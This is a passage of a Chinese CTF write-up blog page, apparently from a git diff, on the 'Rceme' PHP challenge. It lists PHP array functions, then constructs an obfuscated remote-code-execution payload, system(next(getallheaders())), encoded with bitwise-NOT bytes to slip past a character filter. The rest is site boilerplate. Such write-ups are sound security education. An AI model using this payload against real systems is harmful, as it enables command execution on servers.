current() 的别名</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">array_slice() 函数在数组中根据条件取出一段值，并返回</span><br><span class="line">chr() 函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin — 转换十六进制字符串为二进制字符串</span><br><span class="line"></span><br><span class="line">getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</span><br></pre></td></tr></table></figure>
+
+<p>那么我们来构建</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(current(getallheaders()));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//system %8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="comment">//session_id %8C%9A%8C%8C%96%90%91%A0%96%9B</span></span><br><span class="line"><span class="comment">//session_start %8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B</span></span><br><span class="line"><span class="comment">// %9A%89%9E%93</span></span><br><span class="line"><span class="comment">//拼出来 [~%9A%89%9E%93][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%96%9B][!%FF]([~%8C%9A%8C%8C%96%90%91%A0%8C%8B%9E%8D%8B][!%FF]()));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// system(pos(getallheaders()))</span></span><br><span class="line"><span class="comment">//var_dump %89%9E%8D%A0%9B%8A%92%8F</span></span><br><span class="line"><span class="comment">//system %8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="comment">//pos %8F%90%8C</span></span><br><span class="line"><span class="comment">//getallheaders %98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C</span></span><br><span class="line"><span class="comment">//拼出来 [~%8C%86%8C%8B%9A%92][!%FF]([~%8F%90%8C][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span></span><br><span class="line"><span class="comment">//var_dump(pos(getallheaders()))</span></span><br><span class="line"><span class="comment">//[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8F%90%8C][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span></span><br></pre></td></tr></table></figure>
+
+<p>发现首位不可以用，我们再next一下</p>
+<p>最后拼接出来</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(next(getallheaders()));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));&amp;code=351355</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Roamphp2-Myblog"><span class="toc-number">1.</span> <span class="toc-text">Roamphp2-Myblog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Roamphp4-Rceme"><span class="toc-number">2.</span> <span class="toc-text">Roamphp4-Rceme</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
